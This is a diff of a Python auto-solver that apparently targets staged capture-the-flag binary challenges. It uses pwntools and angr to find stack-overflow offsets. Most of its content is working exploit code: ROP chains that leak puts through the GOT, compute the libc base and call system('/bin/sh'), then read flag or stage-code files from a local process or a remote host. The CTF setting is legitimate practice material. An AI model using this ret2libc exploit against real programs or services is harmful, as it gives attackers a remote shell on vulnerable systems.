@@ -8,6 +8,7 @@ basicConfig(filename="/dev/null", level="INFO")  # otherwise pwntools and angr l
 import pwn
 import angr
 
+
 libc_ctype = CDLL("libc.so.6")
 
 def submit_stage_code(comms_connection, code: str) -> bool:
@@ -67,7 +68,7 @@ def find_offset(binary_name: str) -> tuple:
     if len(sim.memory_corruption) > 0:
         solution_state = sim.memory_corruption[0]
         payload = solution_state.posix.dumps(0)
-        offset = payload.decode().find('CCCCCCCC')
+        offset = payload.find(b'CCCCCCCC')
         valid_payload_offset = payload.split(b'CCCCCCCC')[0]
         # pwn.log.info(f"Crashed the program with payload: {payload}")
         # pwn.log.info(f"Offset: {offset}")
@@ -278,73 +279,76 @@ class LevelThreeSolver:
 
     def get_shell(self, challenge_binary: str, target: str) -> bool:
         elf = pwn.context.binary = pwn.ELF(challenge_binary, checksec=False)
-        if target == "local":
-            libc = pwn.ELF(self.libc_local, checksec=False)
-        elif target == "remote":
-            libc = pwn.ELF(self.libc_remote, checksec=False)
-        else:
-            pwn.log.error("Invalid target")
+        try:
+            if target == "local":
+                libc = pwn.ELF(self.libc_local, checksec=False)
+            elif target == "remote":
+                libc = pwn.ELF(self.libc_remote, checksec=False)
+            else:
+                pwn.log.error("Invalid target")
+                return False
+            if target == "local":
+                with pwn.process([elf.path], level="CRITICAL") as proc:
+                    proc.clean()
+                    proc.sendline(pwn.cyclic(400))
+
+                    if proc.poll(True) == -11:
+                        corefile = proc.corefile
+                        pattern = corefile.read(corefile.rsp, 4)
+                        self.offset = pwn.cyclic_find(pattern)
+                        pwn.log.debug(f"Found offset: {self.offset}")
+                        os.remove(corefile.path)
+                    else:
+                        pwn.log.warning(f"Could not crash program: {elf.path}")
+                p = pwn.process([elf.path], level="CRITICAL")
+            elif target == "remote":
+                if not self.payload1 or not self.payload2:
+                    pwn.log.error("Cannot run against remote without a payload!")
+                    return False
+                p = pwn.remote(self.host, self.port, level="CRITICAL")
+
+            rop1 = pwn.ROP(elf)
+            rop1.puts(elf.got.puts)
+            rop1.call(elf.sym["_start"])
+
+            self.payload1 = pwn.flat({
+                self.offset: rop1.chain()
+            })
+            p.clean()
+            p.sendline(self.payload1)
+            leak = pwn.packing.u64(p.recv(6).ljust(8, b"\x00"))
+            pwn.log.info(f"Leaked puts: {hex(leak)}")
+            libc.address = leak - libc.sym.puts
+
+            pwn.log.info(f"Libc base: {hex(libc.address)}")
+
+            rop2 = pwn.ROP(libc)
+            rop2.raw(rop2.find_gadget(["ret"]).address)
+            rop2.call(libc.sym.system, [next(libc.search(b"/bin/sh\x00"))])
+            self.payload2 = pwn.flat({
+                self.offset: rop2.chain()
+            })
+
+            pwn.log.debug(f"Sending payload: {rop2.dump()}")
+            p.clean()
+            p.sendline(self.payload2)
+            pwn.sleep(1)
+            p.clean()
+            if target == "local":
+                p.sendline(b"cat flag.txt")
+                result = p.clean()
+                if len(result) < 1:
+                    pwn.log.debug("Could not get flag")
+                    return False
+            elif target == "remote":
+                p.sendline(b"cat stage_code")
+                result = p.clean()
+                if len(result) < 1:
+                    pwn.log.debug("Could not get stage code")
+                    return False
+            p.close()
+        except EOFError:
             return False
-        if target == "local":
-            with pwn.process([elf.path], level="CRITICAL") as proc:
-                proc.clean()
-                proc.sendline(pwn.cyclic(400))
-
-                if proc.poll(True) == -11:
-                    corefile = proc.corefile
-                    pattern = corefile.read(corefile.rsp, 4)
-                    self.offset = pwn.cyclic_find(pattern)
-                    pwn.log.debug(f"Found offset: {self.offset}")
-                    os.remove(corefile.path)
-                else:
-                    pwn.log.warning(f"Could not crash program: {elf.path}")
-            p = pwn.process([elf.path], level="CRITICAL")
-        elif target == "remote":
-            if not self.payload1 or not self.payload2:
-                pwn.log.error("Cannot run against remote without a payload!")
-                return False
-            p = pwn.remote(self.host, self.port, level="CRITICAL")
-
-        rop1 = pwn.ROP(elf)
-        rop1.puts(elf.got.puts)
-        rop1.call(elf.sym.main)
-
-        self.payload1 = pwn.flat({
-            self.offset: rop1.chain()
-        })
-        p.clean()
-        p.sendline(self.payload1)
-        leak = pwn.packing.u64(p.recv(6).ljust(8, b"\x00"))
-        pwn.log.info(f"Leaked puts: {hex(leak)}")
-        libc.address = leak - libc.sym.puts
-
-        pwn.log.info(f"Libc base: {hex(libc.address)}")
-
-        rop2 = pwn.ROP(libc)
-        rop2.raw(rop2.find_gadget(["ret"]).address)
-        rop2.call(libc.sym.system, [next(libc.search(b"/bin/sh\x00"))])
-        self.payload2 = pwn.flat({
-            self.offset: rop2.chain()
-        })
-
-        pwn.log.debug(f"Sending payload: {rop2.dump()}")
-        p.clean()
-        p.sendline(self.payload2)
-        pwn.sleep(1)
-        p.clean()
-        if target == "local":
-            p.sendline(b"cat flag.txt")
-            result = p.clean()
-            if len(result) < 1:
-                pwn.log.debug("Could not get flag")
-                return False
-        elif target == "remote":
-            p.sendline(b"cat stage_code")
-            result = p.clean()
-            if len(result) < 1:
-                pwn.log.debug("Could not get stage code")
-                return False
-        p.close()
         return result
 
     def solve_level(self, challenge_binary: str) -> bool:
@@ -388,7 +392,6 @@ class LevelFourSolver:
         elf = pwn.context.binary = pwn.ELF(challenge_binary, checksec=False)
         if target == "local":
             self.offset = None
-            p = pwn.process([elf.path], level="CRITICAL")
             libc = pwn.ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
             solved, self.offset = find_offset(elf.path)
             if not solved:
@@ -396,20 +399,21 @@ class LevelFourSolver:
                 return False
             else:
                 pwn.log.success(f"Found memory corruption at offset: {len(self.offset)}")
+                p = pwn.process([elf.path], level="CRITICAL")
         elif target == "remote":
             p = pwn.remote(self.host, self.port, level="CRITICAL")
             libc = pwn.ELF("libc-2.31.so", checksec=False)
 
         rop = pwn.ROP(elf)
         rop.puts(elf.got.puts)
-        rop.call("main")
+        rop.call(elf.sym["_start"])
         pwn.log.debug(rop.dump())
 
         payload1 = self.offset + rop.chain()
 
-        p.clean()
+        p.clean(1)
         p.sendline(payload1)
-        p.recvline()
+        p.recvuntil(b"Valid\n")
         leak = pwn.packing.u64(p.recv(6).ljust(8, b"\x00"))
         pwn.log.info(f"Leaked puts: {hex(leak)}")
         libc.address = leak - libc.sym.puts
@@ -466,34 +470,3 @@ class LevelFourSolver:
         return True
 
 
-class ChallengeSolver:
-    def __init__(self, host: str, chall_port: int, comms_port, local_flag_path: str, binaries_path: str, stage_code_storage_path: str):
-        self.host = host
-        self.chall_port = chall_port
-        self.comms_port = comms_port
-        self.stage_name = None
-        self.local_flag_path = local_flag_path
-        self.binaries_path = binaries_path
-        self.stage_code_storage_path = stage_code_storage_path
-        self.stage_codes = {
-            "level_0": [],
-            "level_1": [],
-            "level_2": [],
-            "level_3": [],
-            "level_4": [],
-        }
-
-        self.comms_connection = pwn.remote(self.host, self.comms_port)
-
-    def solve_stage(self, stage_name: str) -> bool:
-        if stage_name not in self.stage_codes:
-            raise Exception(f"Invalid stage name '{stage_name}'")
-        self.stage_name = stage_name
-        challenges = [os.path.join(
-            self.binaries_path, self.stage_name, i) for i in sorted(os.listdir(os.path.join(self.binaries_path, self.stage_name)))]
-        solved_local = self.level_0_solver(challenges[0], local=True)
-        if not solved_local:
-            return False
-        solved_remote = self.level_0_solver(challenges[0], local=False)
-        if solved_remote:
-            return True
